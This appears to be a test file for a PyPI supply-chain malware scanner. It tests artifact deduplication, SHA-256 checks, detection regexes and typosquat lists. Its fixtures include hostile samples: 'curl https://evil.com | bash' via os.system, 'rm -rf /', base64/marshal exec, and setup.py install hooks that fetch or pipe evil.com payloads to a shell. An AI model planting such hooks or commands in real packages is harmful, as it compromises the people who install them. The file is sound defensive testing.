import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { createHash } from "node:crypto";
import {
  PYPI_FILE_PATTERNS,
  PYPI_INSTALL_HOOK_PATTERNS,
  PYPI_SETUP_FILES,
  PYPI_TYPOSQUAT_PATTERNS,
  PYTHON_EXTENSIONS,
} from "../patterns.js";
import {
  analyzeSetupFileContext,
  checkInstallRequires,
  PyPIArtifactAcquisitionError,
  scanPypiReleaseArtifacts,
  verifyArtifactSha256,
  type PyPIReleaseFile,
} from "../pypi-scanner.js";
import type { Finding } from "../types.js";

function releaseArtifact(
  filename: string,
  packagetype: "sdist" | "bdist_wheel",
): PyPIReleaseFile {
  return {
    filename,
    packagetype,
    url: `https://files.example.test/${filename}`,
    size: 100,
    digests: { sha256: createHash("sha256").update(filename).digest("hex") },
  };
}

describe("PyPI release artifact coverage", () => {
  it("scans a malicious wheel even when an earlier sdist is clean", async () => {
    const releaseFiles = [
      releaseArtifact("demo-1.0.0.tar.gz", "sdist"),
      releaseArtifact("demo-1.0.0-py3-none-any.whl", "bdist_wheel"),
    ];
    const scanned: string[] = [];
    const findings: Finding[] = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (artifact, artifactFindings) => {
        scanned.push(artifact.filename);
        if (artifact.filename.endsWith(".whl")) {
          artifactFindings.push({
            rule: "PYPI_OS_SYSTEM",
            description: "system command execution",
            severity: "high",
            file: "demo/__init__.py",
            recommendation: "review",
          });
          return { totalFiles: 2, filesScanned: 2 };
        }
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(scanned).toEqual(releaseFiles.map((artifact) => artifact.filename));
    expect(counts).toEqual({ totalFiles: 3, filesScanned: 3 });
    expect(findings).toEqual([
      expect.objectContaining({
        rule: "PYPI_OS_SYSTEM",
        file:
          "artifacts/002-demo-1.0.0-py3-none-any.whl/demo/__init__.py",
      }),
    ]);
  });

  it("scans every wheel and keeps duplicate inner paths distinguishable", async () => {
    const releaseFiles = [
      releaseArtifact("demo-1.0.0-cp311-win_amd64.whl", "bdist_wheel"),
      releaseArtifact("demo-1.0.0-cp311-manylinux_x86_64.whl", "bdist_wheel"),
    ];
    const findings: Finding[] = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (artifact, artifactFindings) => {
        artifactFindings.push({
          rule: "PYPI_SUBPROCESS",
          description: "subprocess execution",
          severity: "high",
          file: "demo/native.py",
          match: artifact.filename,
          recommendation: "review",
        });
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(counts).toEqual({ totalFiles: 2, filesScanned: 2 });
    expect(findings.map((finding) => finding.file)).toEqual([
      "artifacts/001-demo-1.0.0-cp311-win_amd64.whl/demo/native.py",
      "artifacts/002-demo-1.0.0-cp311-manylinux_x86_64.whl/demo/native.py",
    ]);
  });

  it("deduplicates repeated release records before counts and findings", async () => {
    const sha256 = "a".repeat(64);
    const first = {
      ...releaseArtifact("demo-1.0.0-py3-none-any.whl", "bdist_wheel"),
      url: "https://files.example.test/demo.whl#download",
      digests: { sha256: sha256.toUpperCase() },
    };
    const releaseFiles = [
      first,
      { ...first, filename: "duplicate-by-digest.whl", url: "https://cdn.example.test/demo.whl" },
      { ...first, filename: "duplicate-by-url.whl", digests: undefined, url: "https://files.example.test/demo.whl" },
    ];
    const findings: Finding[] = [];
    let calls = 0;

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (_artifact, artifactFindings) => {
        calls++;
        artifactFindings.push({
          rule: "PYPI_SUBPROCESS",
          description: "subprocess execution",
          severity: "high",
          file: "demo/native.py",
          recommendation: "review",
        });
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(calls).toBe(1);
    expect(counts).toEqual({ totalFiles: 1, filesScanned: 1 });
    expect(findings).toHaveLength(1);
    expect(findings[0]?.file).toBe(
      "artifacts/001-demo-1.0.0-py3-none-any.whl/demo/native.py",
    );
  });

  it("verifies downloaded bytes against SHA-256 without buffering the artifact", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-pypi-digest-"));
    const artifactPath = path.join(tempDir, "artifact.whl");
    const payload = Buffer.alloc(1024 * 1024 + 17, 0x61);
    fs.writeFileSync(artifactPath, payload);

    try {
      const expected = createHash("sha256").update(payload).digest("hex");
      expect(await verifyArtifactSha256(artifactPath, expected.toUpperCase())).toBe(true);
      expect(await verifyArtifactSha256(artifactPath, "b".repeat(64))).toBe(false);
      expect(await verifyArtifactSha256(artifactPath, "malformed")).toBe(false);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("scans artifacts without a valid SHA-256 identity but marks coverage partial", async () => {
    const releaseFiles = [
      { ...releaseArtifact("missing.whl", "bdist_wheel"), digests: undefined },
      { ...releaseArtifact("malformed.whl", "bdist_wheel"), digests: { sha256: "not-a-digest" } },
    ];
    const findings: Finding[] = [];
    const expectedDigests: Array<string | undefined> = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (_artifact, _artifactFindings, expectedSha256) => {
        expectedDigests.push(expectedSha256);
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(expectedDigests).toEqual([undefined, undefined]);
    expect(counts).toEqual({ totalFiles: 2, filesScanned: 2 });
    expect(findings).toHaveLength(2);
    expect(findings).toEqual([
      expect.objectContaining({
        rule: "PATH_SCAN_INCOMPLETE",
        file: "artifacts/001-missing.whl",
      }),
      expect.objectContaining({
        rule: "PATH_SCAN_INCOMPLETE",
        file: "artifacts/002-malformed.whl",
      }),
    ]);
    expect(findings.every((finding) => finding.description.includes("could not be authenticated"))).toBe(true);
  });

  it("falls back across digest aliases independent of registry order", async () => {
    const sha256 = "c".repeat(64);
    const broken = {
      ...releaseArtifact("broken.whl", "bdist_wheel"),
      url: "https://broken.example.test/shared.whl",
      digests: { sha256 },
    };
    const working = {
      ...releaseArtifact("working.whl", "bdist_wheel"),
      url: "https://working.example.test/shared.whl",
      digests: { sha256 },
    };

    for (const [releaseFiles, expectedCalls] of [
      [[broken, working], [broken.url, working.url]],
      [[working, broken], [working.url]],
    ] as const) {
      const calls: string[] = [];
      const findings: Finding[] = [];
      const counts = await scanPypiReleaseArtifacts(
        [...releaseFiles],
        findings,
        async (artifact, artifactFindings, expectedSha256) => {
          calls.push(artifact.url);
          expect(expectedSha256).toBe(sha256);
          if (artifact.url === broken.url) {
            throw new PyPIArtifactAcquisitionError(artifact.filename);
          }
          artifactFindings.push({
            rule: "PYPI_SUBPROCESS",
            description: "subprocess execution",
            severity: "high",
            file: "demo/native.py",
            recommendation: "review",
          });
          return { totalFiles: 7, filesScanned: 6 };
        },
      );

      expect(calls).toEqual(expectedCalls);
      expect(counts).toEqual({ totalFiles: 7, filesScanned: 6 });
      expect(findings).toHaveLength(1);
      expect(findings[0]?.rule).toBe("PYPI_SUBPROCESS");
    }
  });

  it("retries distinct extraction metadata for the same URL in either order", async () => {
    const sha256 = "9".repeat(64);
    const sharedUrl = "https://files.example.test/shared-archive";
    const mislabeled = {
      ...releaseArtifact("shared.zip", "sdist"),
      url: `${sharedUrl}#sdist-label`,
      digests: { sha256 },
    };
    const correct = {
      ...releaseArtifact("shared.whl", "bdist_wheel"),
      url: `${sharedUrl}#wheel-label`,
      digests: { sha256 },
    };

    for (const [releaseFiles, expectedCalls] of [
      [[mislabeled, correct], [mislabeled.filename, correct.filename]],
      [[correct, mislabeled], [correct.filename]],
    ] as const) {
      const calls: string[] = [];
      const counts = await scanPypiReleaseArtifacts(
        [...releaseFiles],
        [],
        async (artifact, _artifactFindings, expectedSha256) => {
          calls.push(artifact.filename);
          expect(expectedSha256).toBe(sha256);
          if (artifact.filename === mislabeled.filename) {
            throw new PyPIArtifactAcquisitionError(artifact.filename);
          }
          return { totalFiles: 2, filesScanned: 2 };
        },
      );

      expect(calls).toEqual(expectedCalls);
      expect(counts).toEqual({ totalFiles: 2, filesScanned: 2 });
    }
  });
  it("retries after a digest mismatch and counts only the verified alias", async () => {
    const verifiedBytes = Buffer.from("verified wheel bytes");
    const mismatchedBytes = Buffer.from("tampered wheel bytes");
    const sha256 = createHash("sha256").update(verifiedBytes).digest("hex");
    const releaseFiles = [
      {
        ...releaseArtifact("tampered.whl", "bdist_wheel"),
        url: "https://first.example.test/shared.whl",
        digests: { sha256 },
      },
      {
        ...releaseArtifact("verified.whl", "bdist_wheel"),
        url: "https://second.example.test/shared.whl",
        digests: { sha256 },
      },
    ];
    const findings: Finding[] = [];
    let calls = 0;

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (artifact, artifactFindings, expectedSha256) => {
        calls++;
        const bytes = artifact.filename === "tampered.whl"
          ? mismatchedBytes
          : verifiedBytes;
        const actual = createHash("sha256").update(bytes).digest("hex");
        if (actual !== expectedSha256) {
          artifactFindings.push({
            rule: "SHOULD_BE_DISCARDED",
            description: "failed alias finding",
            severity: "high",
            recommendation: "discard",
          });
          throw new PyPIArtifactAcquisitionError(artifact.filename);
        }
        artifactFindings.push({
          rule: "VERIFIED_ALIAS",
          description: "verified alias finding",
          severity: "high",
          recommendation: "review",
        });
        return { totalFiles: 4, filesScanned: 3 };
      },
    );

    expect(calls).toBe(2);
    expect(counts).toEqual({ totalFiles: 4, filesScanned: 3 });
    expect(findings.map((finding) => finding.rule)).toEqual(["VERIFIED_ALIAS"]);
  });

  it("emits one partial result only after every alias fails", async () => {
    const sha256 = "d".repeat(64);
    const releaseFiles = [
      {
        ...releaseArtifact("first-broken.whl", "bdist_wheel"),
        url: "https://first.example.test/broken.whl",
        digests: { sha256 },
      },
      {
        ...releaseArtifact("second-broken.whl", "bdist_wheel"),
        url: "https://second.example.test/broken.whl",
        digests: { sha256 },
      },
    ];
    const findings: Finding[] = [];
    let calls = 0;

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (artifact) => {
        calls++;
        throw new PyPIArtifactAcquisitionError(artifact.filename);
      },
    );

    expect(calls).toBe(2);
    expect(counts).toEqual({ totalFiles: 0, filesScanned: 0 });
    expect(findings).toEqual([
      expect.objectContaining({
        rule: "PATH_SCAN_INCOMPLETE",
        file: "artifacts/001-first-broken.whl",
      }),
    ]);
  });

  it("does not retry aliases after a scanner logic failure", async () => {
    const sha256 = "e".repeat(64);
    const releaseFiles = [
      {
        ...releaseArtifact("first.whl", "bdist_wheel"),
        url: "https://first.example.test/logic.whl",
        digests: { sha256 },
      },
      {
        ...releaseArtifact("second.whl", "bdist_wheel"),
        url: "https://second.example.test/logic.whl",
        digests: { sha256 },
      },
    ];
    let calls = 0;

    await expect(scanPypiReleaseArtifacts(releaseFiles, [], async () => {
      calls++;
      throw new Error("scanner bug");
    })).rejects.toThrow("scanner bug");
    expect(calls).toBe(1);
  });

  it("deduplicates an unambiguous digestless URL-to-SHA identity bridge", async () => {
    const sha256 = "a".repeat(64);
    const releaseFiles = [
      {
        ...releaseArtifact("digestless.whl", "bdist_wheel"),
        url: "https://files.example.test/shared.whl#first",
        digests: undefined,
      },
      {
        ...releaseArtifact("url-bridge.whl", "bdist_wheel"),
        url: "https://files.example.test/shared.whl",
        digests: { sha256 },
      },
      {
        ...releaseArtifact("digest-bridge.whl", "bdist_wheel"),
        url: "https://cdn.example.test/other.whl",
        digests: { sha256: sha256.toUpperCase() },
      },
    ];
    let calls = 0;
    const expectedDigests: Array<string | undefined> = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      [],
      async (_artifact, _findings, expectedSha256) => {
        calls++;
        expectedDigests.push(expectedSha256);
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(calls).toBe(1);
    expect(expectedDigests).toEqual([sha256]);
    expect(counts).toEqual({ totalFiles: 1, filesScanned: 1 });
  });

  it("never merges two different valid digests that reuse one URL", async () => {
    const sharedUrl = "https://files.example.test/shared.whl";
    const releaseFiles = [
      {
        ...releaseArtifact("first.whl", "bdist_wheel"),
        url: sharedUrl,
        digests: { sha256: "a".repeat(64) },
      },
      {
        ...releaseArtifact("second.whl", "bdist_wheel"),
        url: `${sharedUrl}#same-download-url`,
        digests: { sha256: "b".repeat(64) },
      },
    ];
    const expectedDigests: Array<string | undefined> = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      [],
      async (_artifact, _findings, expectedSha256) => {
        expectedDigests.push(expectedSha256);
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(expectedDigests).toEqual(["a".repeat(64), "b".repeat(64)]);
    expect(counts).toEqual({ totalFiles: 2, filesScanned: 2 });
  });

  it("does not trust malformed digest text to merge distinct URLs", async () => {
    const releaseFiles = [
      { ...releaseArtifact("one.whl", "bdist_wheel"), digests: { sha256: "abc" } },
      {
        ...releaseArtifact("two.whl", "bdist_wheel"),
        url: "https://files.example.test/two.whl",
        digests: { sha256: "abc" },
      },
    ];
    let calls = 0;

    await scanPypiReleaseArtifacts(releaseFiles, [], async () => {
      calls++;
      return { totalFiles: 1, filesScanned: 1 };
    });

    expect(calls).toBe(2);
  });

  it("keeps malformed digest metadata separate from a valid digest at the same URL", async () => {
    const sharedUrl = "https://files.example.test/shared.whl";
    const sha256 = "f".repeat(64);
    const releaseFiles = [
      {
        ...releaseArtifact("valid.whl", "bdist_wheel"),
        url: sharedUrl,
        digests: { sha256 },
      },
      {
        ...releaseArtifact("malformed.whl", "bdist_wheel"),
        url: `${sharedUrl}#duplicate-url`,
        digests: { sha256: "not-a-digest" },
      },
    ];
    const expectedDigests: Array<string | undefined> = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      [],
      async (_artifact, _findings, expectedSha256) => {
        expectedDigests.push(expectedSha256);
        return { totalFiles: 1, filesScanned: 1 };
      },
    );

    expect(expectedDigests).toEqual([sha256, undefined]);
    expect(counts).toEqual({ totalFiles: 2, filesScanned: 2 });
  });
  it("marks one failed artifact partial and continues scanning later artifacts", async () => {
    const releaseFiles = [
      releaseArtifact("broken-1.0.0.tar.gz", "sdist"),
      releaseArtifact("working-1.0.0-py3-none-any.whl", "bdist_wheel"),
    ];
    const findings: Finding[] = [];

    const counts = await scanPypiReleaseArtifacts(
      releaseFiles,
      findings,
      async (artifact) => {
        if (artifact.filename.startsWith("broken")) {
          throw new PyPIArtifactAcquisitionError(artifact.filename);
        }
        return { totalFiles: 4, filesScanned: 3 };
      },
    );

    expect(counts).toEqual({ totalFiles: 4, filesScanned: 3 });
    expect(findings).toEqual([
      expect.objectContaining({
        rule: "PATH_SCAN_INCOMPLETE",
        severity: "info",
        file: "artifacts/001-broken-1.0.0.tar.gz",
      }),
    ]);
  });
});

describe("PyPI Scanner Patterns", () => {
  describe("Python malicious code detection", () => {
    it("should detect os.system() calls", () => {
      const code = 'os.system("curl https://evil.com | bash")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_OS_SYSTEM",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect subprocess.call() and subprocess.run()", () => {
      const codes = [
        'subprocess.call(["curl", "https://evil.com"])',
        'subprocess.run(["wget", "https://evil.com/payload"])',
        'subprocess.Popen(["bash", "-c", "malicious"])',
        'subprocess.check_output(["id"])',
        'subprocess.check_call(["rm", "-rf", "/"])',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUBPROCESS",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect exec() with encoded strings", () => {
      const codes = [
        'exec(base64.b64decode("aW1wb3J0IG9z"))',
        'exec(codecs.decode("payload", "rot13"))',
        'exec(bytes.fromhex("696d706f7274206f73").decode())',
      ];
      const execPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_ENCODED",
      );
      expect(execPattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(execPattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect eval() with encoded strings", () => {
      const codes = [
        'eval(base64.b64decode("aW1wb3J0IG9z"))',
        'eval(codecs.decode("payload", "rot13"))',
        'eval(bytes.fromhex("696d706f7274206f73").decode())',
      ];
      const evalPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EVAL_ENCODED",
      );
      expect(evalPattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(evalPattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect __import__('base64') pattern", () => {
      const codes = [
        "__import__('base64')",
        '__import__("base64")',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_BASE64",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect __import__('marshal') pattern", () => {
      const code = "__import__('marshal')";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_MARSHAL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect pip install from suspicious URLs", () => {
      const code =
        "pip install --index-url https://evil.com/simple/ malicious-pkg";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUSPICIOUS_INDEX",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should NOT flag pip install from pypi.org", () => {
      const code =
        "pip install --index-url https://pypi.org/simple/ some-pkg";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUSPICIOUS_INDEX",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should detect urllib.request.urlopen()", () => {
      const code = 'urllib.request.urlopen("https://evil.com/payload")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_URLLIB_FETCH",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect exec(compile()) pattern", () => {
      const code = 'exec(compile(open("payload.py").read(), "<string>", "exec"))';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_COMPILE",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect install class override (class inheriting from install)", () => {
      const codes = [
        "class CustomInstall(install):",
        "class PostInstall(develop):",
        "class MyEggInfo(egg_info):",
        "class BuildStep(bdist_egg):",
        "class MySdist(sdist):",
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_INSTALL_CLASS_OVERRIDE",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect marshal.loads() calls", () => {
      const codes = [
        'marshal.loads(encoded_data)',
        'result = marshal.loads(payload)',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_MARSHAL_LOADS",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect exec(marshal.loads()) pattern", () => {
      const code = 'exec(marshal.loads(base64.b64decode("payload")))';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_MARSHAL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect base64.b64decode combined with exec on same line", () => {
      const codes = [
        'data = base64.b64decode("payload"); exec(data)',
        'exec(base64.b64decode("hidden"))',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_B64_EXEC_COMBINED",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });
  });

  describe("Install hook detection", () => {
    it("should detect custom install cmdclass", () => {
      const code = `cmdclass = {'install': CustomInstall}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_INSTALL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom develop cmdclass", () => {
      const code = `cmdclass = {"develop": CustomDevelop}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_DEVELOP",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom egg_info cmdclass", () => {
      const code = `cmdclass = {'egg_info': CustomEggInfo}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_EGG_INFO",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom build_ext cmdclass", () => {
      const code = `cmdclass = {'build_ext': CustomBuildExt}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_BUILD_EXT",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });
  });

  describe("Setup file combined analysis", () => {
    it("should detect cmdclass + subprocess as hook with system exec", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    def run(self):
        subprocess.run(["curl", "https://evil.com/payload.sh", "-o", "/tmp/p.sh"])
        install.run(self)

setup(
    name='malicious-pkg',
    cmdclass={'install': PostInstallCommand},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      const hookExec = findings.find((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC");
      expect(hookExec).toBeDefined();
      expect(hookExec!.severity).toBe("critical");
    });

    it("should detect cmdclass + os.system as hook with system exec", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstall(install):
    def run(self):
        os.system("curl https://evil.com/malware | bash")
        install.run(self)

setup(
    name='evil-pkg',
    cmdclass={'install': PostInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC")).toBe(true);
    });

    it("should detect cmdclass + obfuscated exec (base64 + exec)", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import base64

class CustomInstall(install):
    def run(self):
        exec(base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3M="))
        install.run(self)

setup(
    name='obfuscated-pkg',
    cmdclass={'install': CustomInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      const hookObf = findings.find((f) => f.rule === "PYPI_HOOK_OBFUSCATED_EXEC");
      expect(hookObf).toBeDefined();
      expect(hookObf!.severity).toBe("critical");
    });

    it("should detect cmdclass + marshal.loads as obfuscated exec", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import marshal

class CustomInstall(install):
    def run(self):
        exec(marshal.loads(payload_bytes))
        install.run(self)

setup(
    name='bytecode-pkg',
    cmdclass={'install': CustomInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_OBFUSCATED_EXEC")).toBe(true);
    });

    it("should detect cmdclass + urllib download as hook with download", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import urllib.request

class PostInstall(install):
    def run(self):
        urllib.request.urlopen("https://evil.com/payload")
        install.run(self)

setup(
    name='download-pkg',
    cmdclass={'install': PostInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_DOWNLOAD")).toBe(true);
    });

    it("should detect cmdclass + requests.get as hook with download", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import requests

class PostInstall(install):
    def run(self):
        requests.get("https://evil.com/payload")
        install.run(self)

setup(
    name='download-pkg',
    cmdclass={'install': PostInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_DOWNLOAD")).toBe(true);
    });

    it("should detect install class override without cmdclass dict", () => {
      const setupPy = `
from setuptools.command.install import install
import subprocess

class EvilInstall(install):
    def run(self):
        subprocess.run(["bash", "-c", "curl evil.com | sh"])
        install.run(self)
`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC")).toBe(true);
    });

    it("should NOT flag setup.py without cmdclass or install override", () => {
      const setupPy = `
from setuptools import setup

setup(
    name='clean-pkg',
    version='1.0.0',
    install_requires=['requests>=2.0'],
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC")).toBe(false);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_OBFUSCATED_EXEC")).toBe(false);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_DOWNLOAD")).toBe(false);
    });
  });

  describe("Typosquatted dependency detection", () => {
    it("should detect typosquatted packages in install_requires", () => {
      const setupPy = `
setup(
    name='evil-pkg',
    install_requires=['r3quests>=2.0', 'crypt0graphy'],
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(2);
      expect(findings[0]!.rule).toBe("PYPI_TYPOSQUAT_DEP");
      expect(findings[0]!.match).toBe("r3quests");
      expect(findings[1]!.match).toBe("crypt0graphy");
    });

    it("should detect various typosquatted package names", () => {
      const typosquats = [
        "reqeusts", "requsets", "r3quests",
        "crypt0graphy", "cryptograhpy",
        "python-dateutill", "numppy", "numpie",
        "pandsa", "djang0", "dajngo",
        "urlib3", "colourama", "colrama",
        "setuptool", "flaskk", "flaask",
      ];

      for (const pkg of typosquats) {
        let matched = false;
        for (const pattern of PYPI_TYPOSQUAT_PATTERNS) {
          if (new RegExp(pattern).test(pkg)) {
            matched = true;
            break;
          }
        }
        expect(matched).toBe(true);
      }
    });

    // Registry-verified 2026-08-30. All three are real PyPI projects that the
    // typosquat alternations were flagging: "numpi" is muSpectre/NuMPI (MPI-parallel
    // numerics, 2018, 29 releases), "crytography" is a defensive registration whose
    // summary reads 'I think you meant "cryptography"', and "py-dateutil" is Tomi
    // Pievilaeinen's dateutil packaging on bitbucket. Resemblance is not evidence.
    it("must NOT flag registry-verified legitimate PyPI projects", () => {
      for (const pkg of ["numpi", "crytography", "py-dateutil"]) {
        const matches = PYPI_TYPOSQUAT_PATTERNS.filter((pattern) =>
          new RegExp(pattern).test(pkg),
        );
        expect(matches, `${pkg} must not match any PyPI typosquat pattern`).toEqual([]);
      }
    });

    it("should NOT flag legitimate package names", () => {
      const legitimate = [
        "requests", "cryptography", "python-dateutil",
        "numpy", "pandas", "django", "flask",
        "urllib3", "colorama", "setuptools",
      ];

      for (const pkg of legitimate) {
        let matched = false;
        for (const pattern of PYPI_TYPOSQUAT_PATTERNS) {
          if (new RegExp(pattern).test(pkg)) {
            matched = true;
            break;
          }
        }
        expect(matched).toBe(false);
      }
    });

    it("should flag very long single-word lowercase names", () => {
      const longName = "abcdefghijklmnopqrstu"; // 21 chars
      let matched = false;
      for (const pattern of PYPI_TYPOSQUAT_PATTERNS) {
        if (new RegExp(pattern).test(longName)) {
          matched = true;
          break;
        }
      }
      expect(matched).toBe(true);
    });

    it("should strip version specifiers before checking", () => {
      const setupPy = `
setup(
    install_requires=['requsets>=1.0.0', 'numppy==1.2.3'],
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(2);
      expect(findings[0]!.match).toBe("requsets");
      expect(findings[1]!.match).toBe("numppy");
    });

    it("should handle install_requires with no typosquats", () => {
      const setupPy = `
setup(
    install_requires=['requests>=2.0', 'flask', 'numpy'],
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(0);
    });

    it("should handle missing install_requires gracefully", () => {
      const setupPy = `
setup(
    name='minimal-pkg',
    version='1.0.0',
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(0);
    });
  });

  describe("Pattern metadata", () => {
    it("should have correct severity for critical patterns", () => {
      const criticalRules = [
        "PYPI_EXEC_ENCODED", "PYPI_EVAL_ENCODED", "PYPI_SUSPICIOUS_INDEX",
        "PYPI_EXEC_MARSHAL", "PYPI_B64_EXEC_COMBINED",
      ];
      for (const rule of criticalRules) {
        const pattern = PYPI_FILE_PATTERNS.find((p) => p.rule === rule);
        expect(pattern).toBeDefined();
        expect(pattern!.severity).toBe("critical");
      }
    });

    it("should have correct severity for high patterns", () => {
      const highRules = [
        "PYPI_OS_SYSTEM",
        "PYPI_SUBPROCESS",
        "PYPI_IMPORT_BASE64",
        "PYPI_IMPORT_MARSHAL",
        "PYPI_URLLIB_FETCH",
        "PYPI_EXEC_COMPILE",
        "PYPI_MARSHAL_LOADS",
      ];
      for (const rule of highRules) {
        const pattern = PYPI_FILE_PATTERNS.find((p) => p.rule === rule);
        expect(pattern).toBeDefined();
        expect(pattern!.severity).toBe("high");
      }
    });

    it("should include all expected PyPI setup files", () => {
      expect(PYPI_SETUP_FILES.has("setup.py")).toBe(true);
      expect(PYPI_SETUP_FILES.has("setup.cfg")).toBe(true);
